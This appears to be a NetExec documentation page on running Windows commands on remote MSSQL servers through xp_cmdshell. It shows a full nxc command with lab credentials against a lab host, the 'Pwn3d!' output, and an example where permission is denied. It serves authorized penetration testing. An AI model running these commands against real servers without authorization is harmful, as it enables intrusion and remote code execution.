---
description: Execute Windows command using NetExec
---

# Windows command

### Execute Windows Command

This option use `xp_cmdshell` to exec command on the remote host.

```bash
nxc mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
MSSQL       10.10.10.59     1433   None             [+] sa:GWE3V65#6KFH93@4GWTG2G (Pwn3d!)
MSSQL       10.10.10.59     1433   None             [+] Executed command via mssqlexec
MSSQL       10.10.10.59     1433   None             --------------------------------------------------------------------------------
MSSQL       10.10.10.59     1433   None             tally\sarah
```

If permission is **DENIED**:

```bash
MSSQL       10.10.10.52     1433   None             [+] admin:m$$ql_S@_P@ssW0rd! (Pwn3d!)
MSSQL       10.10.10.52     1433   None             [-] ERROR(MANTIS\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
MSSQL       10.10.10.52     1433   None             [+] Executed command via mssqlexec
MSSQL       10.10.10.52     1433   None             None
```

{% hint style="info" %}
When playing with MSSQL, you can use the tool [MSDAT ](https://github.com/quentinhardy/msdat)from [quentinhardy](https://github.com/quentinhardy)
{% endhint %}

{% embed url="https://github.com/quentinhardy/msdat" %}
